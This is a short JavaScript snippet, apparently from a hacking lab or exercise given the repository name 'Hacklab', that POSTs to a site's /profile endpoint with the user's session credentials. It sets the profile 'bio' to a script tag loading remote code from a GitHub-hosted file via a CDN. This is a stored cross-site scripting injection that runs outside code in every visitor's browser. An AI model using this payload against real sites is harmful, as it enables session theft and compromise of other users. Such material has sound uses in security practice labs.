(async () => {
  try {
    const contenido_text = `<script src="https://cdn.jsdelivr.net/gh/Maximo-Vazquez/Hacklab@main/hacklab.js"> <script>`;

    const body = new URLSearchParams();
    body.append('bio', contenido_text);
    const resp = await fetch('/profile', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: body.toString(),
      credentials: 'same-origin'
    });
    const text = await resp.text();
    console.log('Respuesta del servidor:', text);
  } catch (err) {
    console.error(err);
  }
})();